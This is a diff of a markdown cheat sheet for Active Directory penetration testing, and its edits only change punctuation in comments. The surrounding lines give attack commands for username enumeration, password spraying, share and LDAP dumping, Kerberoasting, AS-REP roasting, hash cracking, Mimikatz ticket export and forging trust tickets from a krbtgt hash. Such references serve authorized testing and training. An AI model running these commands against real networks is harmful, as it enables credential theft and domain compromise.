@@ -13,7 +13,7 @@ draft = false
 sudo arp-scan -l
 fping -asgq 172.16.5.0/23
 
-# Kerbrute — username enumeration without credentials
+# Kerbrute: username enumeration without credentials
 kerbrute userenum -d DOMAIN.LOCAL --dc 172.16.5.5 /usr/share/wordlists/seclists/Usernames/jsmith.txt
 
 # RID brute-force with null/guest session
@@ -44,7 +44,7 @@ crackmapexec smb <dc-ip> --pass-pol
 
 ---
 
-## Credentialed Enumeration — Linux
+## Credentialed Enumeration: Linux
 
 ```bash
 # CrackMapExec
@@ -61,7 +61,7 @@ crackmapexec smb <dc-ip> -u users.txt -p passwords.txt --no-bruteforce --continu
 smbmap -u user -p pass -d DOMAIN.LOCAL -H <dc-ip>
 smbmap -u user -p pass -d DOMAIN.LOCAL -H <dc-ip> -R 'Share' --dir-only
 
-# ldapdomaindump — dump everything to files
+# ldapdomaindump: dump everything to files
 ldapdomaindump -u 'DOMAIN\user' -p 'pass' <dc-ip> -o ldap/
 
 # Windapsearch
@@ -74,7 +74,7 @@ bloodhound-python -u user -p 'pass' -ns <dc-ip> -d domain.local -c all
 
 ---
 
-## Credentialed Enumeration — Windows
+## Credentialed Enumeration: Windows
 
 ```powershell
 # ActiveDirectory module
@@ -98,7 +98,7 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 .\SharpHound.exe -c All --zipfilename output
 # Upload the zip to BloodHound GUI
 
-# Snaffler — credential/config file hunting in shares
+# Snaffler: credential/config file hunting in shares
 Snaffler.exe -s -d domain.local -o snaffler.log -v data
 ```
 
@@ -107,7 +107,7 @@ Snaffler.exe -s -d domain.local -o snaffler.log -v data
 ## Kerberoasting
 
 ```bash
-# Linux — list SPNs
+# Linux: list SPNs
 impacket-GetUserSPNs -dc-ip <dc-ip> DOMAIN.LOCAL/user
 
 # Request all TGS tickets
@@ -121,10 +121,10 @@ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
 ```
 
 ```powershell
-# Windows — PowerView
+# Windows: PowerView
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
 
-# Windows — setspn + Mimikatz
+# Windows: setspn + Mimikatz
 setspn.exe -Q */*
 # In Mimikatz: kerberos::list /export  → kirbi2john.py → hashcat -m 13100
 ```
@@ -137,7 +137,7 @@ setspn.exe -Q */*
 # Users with pre-auth disabled (no creds needed)
 impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile users.txt -dc-ip <dc-ip>
 
-# With credentials — find all vulnerable accounts
+# With credentials: find all vulnerable accounts
 impacket-GetNPUsers DOMAIN.LOCAL/user:pass -dc-ip <dc-ip> -request
 
 # Crack
@@ -170,7 +170,7 @@ impacket-psexec -k -no-pass DOMAIN/user@target
 # Enumerate trusts from Linux
 impacket-GetADUsers -dc-ip <dc-ip> DOMAIN/user:pass -all
 
-# BloodHound — query: "Map Domain Trusts"
+# BloodHound: query: "Map Domain Trusts"
 
 # Exploit SID History / trust relationships
 impacket-ticketer -nthash <krbtgt-hash> -domain-sid <SID> -domain DOMAIN.LOCAL -extra-sid <child-SID> -spn krbtgt/TRUSTED.DOMAIN Administrator
